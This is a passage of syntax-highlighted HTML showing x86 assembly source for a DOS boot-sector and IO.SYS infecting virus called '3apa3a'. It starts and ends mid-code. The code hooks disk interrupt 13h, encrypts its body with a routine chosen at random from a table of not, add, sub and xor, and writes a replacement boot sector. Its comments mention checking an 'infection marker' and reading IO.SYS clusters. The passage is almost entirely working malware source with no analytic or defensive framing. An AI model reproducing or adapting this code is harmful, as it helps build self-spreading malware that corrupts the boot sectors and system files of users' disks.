                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">;patch3        ; write io portion to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">37</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0"> </span><span class="sc1">;patch4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; bx = 600</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_i13</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">46C</span><span class="sc0">               </span><span class="sc1">; get timer ticks</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; eight possible instructions</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83</span><span class="sc4">,</span><span class="sc2">0E3</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; and bx,3</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; convert to word index</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">encrypt_table</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; bl decides which ptr to use</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2BBE</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; patch pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decrypt</span><span class="sc4">-</span><span class="sc5">bs_3apa3a</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; and start location</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">encrypt_instr</span><span class="sc4">-</span><span class="sc5">bs_3apa3a</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0CF40</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">patch_endptr</span><span class="sc4">-</span><span class="sc5">bs_3apa3a</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">                   </span><span class="sc1">; encode xchg ax,??</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc0">                   </span><span class="sc1">; encode inc pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">patch_incptr</span><span class="sc4">-</span><span class="sc5">bs_3apa3a</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">decrypt_table</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">decrypt_instr</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83</span><span class="sc4">,</span><span class="sc2">0C7</span><span class="sc0"> </span><span class="sc1">;add di,XX       ; start past decryptor</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">bs_3apa3a_decrypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">bs_3apa3a</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">end_crypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">bs_3apa3a_decrypt</span><span class="sc1">; bytes to crypt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc5">decrypt_instr</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_loop</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; write the replacement</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; boot sector to the disk</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_i13</span><span class="sc0">
</span><span class="sc5">exit_i13</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">old_i13</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">decrypt_table</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

</span><span class="sc5">encrypt_table</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">014F6</span><span class="sc0">                    </span><span class="sc1">; not</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0480</span><span class="sc0">                    </span><span class="sc1">; add</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">2C80</span><span class="sc0">                    </span><span class="sc1">; sub</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">3480</span><span class="sc0">                    </span><span class="sc1">; xor</span><span class="sc0">
</span><span class="sc1">; This marks the end of the IO.SYS only portion of 3apa3a</span><span class="sc0">

</span><span class="sc1">; The boot sector portion of 3apa3a follows.</span><span class="sc0">

                </span><span class="sc5">adj_ofs</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">7C00</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">zero</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">bs_3apa3a</span><span class="sc0">

</span><span class="sc5">bs_3apa3a</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">decrypt</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc1">; The following is an invalid boot sector. Replace it with</span><span class="sc0">
                </span><span class="sc1">; yours.</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'        '</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00</span><span class="sc0">

</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BF</span><span class="sc0"> </span><span class="sc1">; mov di,</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">adj_ofs</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">bs_3apa3a_decrypt</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2e</span><span class="sc0"> </span><span class="sc1">; cs:</span><span class="sc0">
</span><span class="sc5">encrypt_instr</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc0">                  </span><span class="sc1">; sub byte ptr [di],XX</span><span class="sc0">
</span><span class="sc5">patch_incptr</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; temporary value for cryptval</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81</span><span class="sc0">  </span><span class="sc1">; cmp</span><span class="sc0">
</span><span class="sc5">patch_endptr</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ff</span><span class="sc0"> </span><span class="sc1">; pointer</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">adj_ofs</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">end_crypt</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">decrypt_loop</span><span class="sc0">
</span><span class="sc5">bs_3apa3a_decrypt</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">enter_bs_3apa3a</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">load_original</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; set up the read</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; of the original boot sector</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B9</span><span class="sc0"> </span><span class="sc1">; mov cx, XXXX</span><span class="sc0">
</span><span class="sc5">patch3</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B6</span><span class="sc0">
</span><span class="sc5">patch4</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">; es:bx = 0:7C00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc0">                    </span><span class="sc1">; jump to code in stack</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">bs_3apa3a</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">enter_bs_3apa3a</span><span class="sc4">:</span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; set stack to just below us</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7C00</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">                   </span><span class="sc1">; reset hard drive</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2F72</span><span class="sc0">                 </span><span class="sc1">; encode JNZ load_original at</span><span class="sc0">
                                                </span><span class="sc1">; 7BFE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">; set segment registers to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">; 7C00</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">200</span><span class="sc4">,</span><span class="sc2">201</span><span class="sc0">     </span><span class="sc1">; do a read</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">202</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">               </span><span class="sc1">; from the hard drive</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; read to 7C00:0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; read head 1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; read sector 1</span><span class="sc0">
                                                </span><span class="sc1">; (assumes active boot</span><span class="sc0">
                                                </span><span class="sc1">; sector is here)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">13CDh</span><span class="sc0">                </span><span class="sc1">; encode int 13 at 7BFC</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exec_int13</span><span class="sc0">              </span><span class="sc1">; do the read</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">203</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0AA</span><span class="sc0">     </span><span class="sc1">; is it valid bs?</span><span class="sc0">
</span><span class="sc5">jnz_load_original</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">load_original</span><span class="sc0">           </span><span class="sc1">; if not, assume infected and</span><span class="sc0">
                                                </span><span class="sc1">; transfer control to it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">13</span><span class="sc0">                </span><span class="sc1">; get number of sectors in</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; image - 1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5103</span><span class="sc0">                 </span><span class="sc1">; hard drive too small? (5103h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">load_original</span><span class="sc0">           </span><span class="sc1">; sectors ~ 10.6 megs)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">1C</span><span class="sc0">                </span><span class="sc1">; get number hidden sectors</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0E</span><span class="sc0">                </span><span class="sc1">; add number reserved sectors</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; store at location that holds</span><span class="sc0">
                                                </span><span class="sc1">; the end of OEM signature</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">16</span><span class="sc0">                </span><span class="sc1">; add sectors per FAT</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; go down two sectors</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">work_on_sectors</span><span class="sc0">         </span><span class="sc1">; load end of FAT to 7C00:203</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">16</span><span class="sc0">                </span><span class="sc1">; get sectors per FAT</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; save the value</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">10</span><span class="sc0">          </span><span class="sc1">; multiply by # FATs</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">9</span><span class="sc0">                 </span><span class="sc1">; calculate start of root dir</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; store it in work buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">11</span><span class="sc0">                </span><span class="sc1">; get number sectors the</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; root directory takes</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; and calculate start of data</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                 </span><span class="sc1">; area and store it in buffer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">work_on_sectors</span><span class="sc0">         </span><span class="sc1">; get first 5 sectors of the</span><span class="sc0">
                                                </span><span class="sc1">; root directory</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">403</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">   </span><span class="sc1">; volume label bit set on first</span><span class="sc0">
                                                </span><span class="sc1">; entry? (infection marker)</span><span class="sc0">
</span><span class="sc5">jne_load_original</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; if so, already infected, so</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">jnz_load_original</span><span class="sc0">       </span><span class="sc1">; quit</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1003</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">403</span><span class="sc4">+</span><span class="sc2">1A</span><span class="sc0">            </span><span class="sc1">; get starting cluster number</span><span class="sc0">
                                                </span><span class="sc1">; of IO.SYS</span><span class="sc0">
</span><span class="sc5">read_IO_SYS</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; convert cluster to absolute</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clus_to_abs_sec</span><span class="sc0">         </span><span class="sc1">; sector number</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">work_on_sector</span><span class="sc0">          </span><span class="sc1">; read in one cluster of IO.SYS</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">403</span><span class="sc4">+</span><span class="sc2">0A00</span><span class="sc0">             </span><span class="sc1">; read into this buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; find the sector with the FAT</span><span class="sc0">
